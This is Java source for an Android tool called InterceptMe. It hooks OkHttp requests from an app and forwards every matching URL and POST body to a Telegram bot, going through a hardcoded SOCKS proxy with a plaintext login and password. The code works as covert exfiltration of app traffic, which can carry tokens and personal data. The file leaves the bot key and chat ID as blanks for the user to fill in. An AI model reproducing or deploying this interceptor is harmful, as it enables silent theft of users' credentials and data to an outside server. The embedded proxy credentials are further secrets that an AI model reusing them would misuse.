package com.heavy87.InterceptMe;

import android.os.AsyncTask;

import org.json.JSONObject;

import java.io.IOException;
import java.lang.reflect.Method;
import java.net.Authenticator;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.PasswordAuthentication;
import java.net.Proxy;
import java.net.UnknownHostException;
import java.nio.charset.Charset;
import java.util.HashMap;
import java.util.Map;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;

import okhttp3.internal.http2.Http2Connection;

class NetworkTask extends AsyncTask<Void, Void, Void> {
    private String botURL;
    private Request request;
    boolean useProxy;
    private Map<String, Object> proxyParams;
    private final MediaType JSON = MediaType.parse("application/json; charset=utf-8");

    private Proxy buildProxy(Map<String, Object> proxyParams) {
        try {
            return new Proxy((Proxy.Type) proxyParams.get("type"), new InetSocketAddress(InetAddress.getByName(proxyParams.get("host").toString()), Integer.parseInt(proxyParams.get("port").toString())));
        } catch (UnknownHostException e) {
            e.printStackTrace();
            return null;
        }
    }

    private void buildProxyParams(Proxy.Type type, String host, int port) {
        this.proxyParams = new HashMap<>();
        this.proxyParams.put("type", type);
        this.proxyParams.put("host", host);
        this.proxyParams.put("port", port);
        this.useProxy = true;
    }

    @Override
    protected Void doInBackground(Void... voids) {
        OkHttpClient httpClient;
        if (this.useProxy) {
            httpClient = new OkHttpClient.Builder().proxy(buildProxy(this.proxyParams)).build();
        } else {
            httpClient = new OkHttpClient();
        }
        try {
            httpClient.newCall(this.request).execute();
            System.out.print("test");
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    NetworkTask(String key) {
        this.botURL = "https://api.telegram.org/bot" + key;
    }

    void setProxyParams(Proxy.Type type, final String host, final int port, final String login, final String password) {
        Authenticator.setDefault(new Authenticator() {
            @Override
            protected PasswordAuthentication getPasswordAuthentication() {
                if (getRequestingHost().equals(host)) {
                    if (getRequestingPort() == port) {
                        return new PasswordAuthentication(login, password.toCharArray());
                    }
                    return null;
                }
                return null;
            }
        });
        this.buildProxyParams(type, host, port);
    }

    public void setProxyParams(Proxy.Type type, String host, int port) {
        this.buildProxyParams(type, host, port);
    }

    public void removeProxy() {
        this.proxyParams = new HashMap<String, Object>();
        this.useProxy = false;
    }

    void buildRequest(JSONObject jsonRequest) {
        boolean isOldHttpVersion = false;
        Method[] methods = RequestBody.class.getMethods();
        RequestBody requestBody;
        for (Method m : methods) {
            if (!m.getName().equals("create")) {
                continue;
            }
            Class<?>[] pType = m.getParameterTypes();
            if (pType.length == 2 && pType[0].toString().contains("MediaType") && pType[1].toString().contains("String")) {
                isOldHttpVersion = !isOldHttpVersion;
            }
        }
        if (isOldHttpVersion) {
            requestBody = RequestBody.create(this.JSON, jsonRequest.toString());
        } else {
            requestBody = RequestBody.create(jsonRequest.toString(), this.JSON);
        }
        this.botURL += "/sendMessage";
        this.request = new Request.Builder().url(this.botURL).post(requestBody).build();
    }
}

final class Telegram extends NetworkTask {

    Telegram(String key) {
        super(key);
    }

    void sendMessageToChat(String message, int chatId) {
        Map<String, Object> body = new HashMap<String, Object>();
        body.put("chat_id", chatId);
        body.put("text", message);
        body.put("parse_mode", "HTML");
        JSONObject jsonRequest = new JSONObject(body);
        buildRequest(jsonRequest);
    }
}

public final class InterceptMe {
    static Class<?> getClassFromParamClass(Class<?> TargetClass, String methodName, int countParams, int paramIndex) {
        Method[] methods = TargetClass.getMethods();
        Class<?> FoundClass;
        for (Method m : methods) {
            if (!m.getName().equals(methodName)) {
                continue;
            }
            Class<?>[] pType = m.getParameterTypes();
            if (pType.length == countParams) {
                try {
                    FoundClass = Class.forName(pType[paramIndex].getName());
                    return FoundClass;
                } catch (ClassNotFoundException e) {
                    e.printStackTrace();
                    return null;
                }
            }
        }
        return null;
    }

    static Method getMethodFromClass(Class<?> TargetClass, String name, int countParams) {
        Method[] methods = TargetClass.getMethods();
        for (Method m : methods) {
            if (m.getName().equals(name) && (m.getParameterTypes().length == countParams))
                return m;
        }
        return null;
    }

    static Method getMethodByParamsClass(Class<?> TargetClass, Class<?>... parameterTypes) {
        Method[] methods = TargetClass.getMethods();
        Method foundMethod = null;
        int matchCount = 0;
        for (Method m : methods) {
            for (Class<?> pType : m.getParameterTypes()) {
                if (pType.getName().equals(parameterTypes[matchCount].getName())) {
                    matchCount++;
                    foundMethod = m;
                }
            }
            if (matchCount == parameterTypes.length) {
                return foundMethod;
            }
        }
        return null;
    }

    public static void send(Request request) {
        try {
            //!!!Please modify this vars!!!
            int chatId = 0;
            //enter your telegram bot key
            String botKey = null;
            if (chatId==0 || botKey==null)
                return;
            Telegram telegram = new Telegram(botKey);
            //24.05.2020 this proxy is ok
            telegram.setProxyParams(Proxy.Type.SOCKS, "orbtl.s5.opennetwork.cc", 999, "369389927", "ElzXFZlC");
            if (request.url().toString().contains("api")) {
                switch (request.method()) {
                    case "GET":
                        telegram.sendMessageToChat("<b>" + request.method() + "</b>\n" + "<code>" + request.url() + "</code>", chatId);
                        break;
                    case "POST":
                        Class<?> R_Buffer = getClassFromParamClass(Http2Connection.class, "writeData", 4, 2);
                        if (R_Buffer == null)
                            return;
                        Object buffer = R_Buffer.newInstance();
                        Method Buffer_readString = getMethodByParamsClass(R_Buffer, Charset.class);
                        Method RequestBody_writeTo = getMethodFromClass(RequestBody.class, "writeTo", 1);
                        if (RequestBody_writeTo == null)
                            return;
                        RequestBody_writeTo.invoke(request.body(), buffer);
                        String requestString = (String) Buffer_readString.invoke(buffer, Charset.defaultCharset());
                        telegram.sendMessageToChat("<b>" + request.method() + "</b>\n<code>" + request.url() + "</code>\n<u>body:</u>\n<code>" + requestString + "</code>", chatId);
                        break;
                    default:
                        return;
                }
                telegram.execute();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
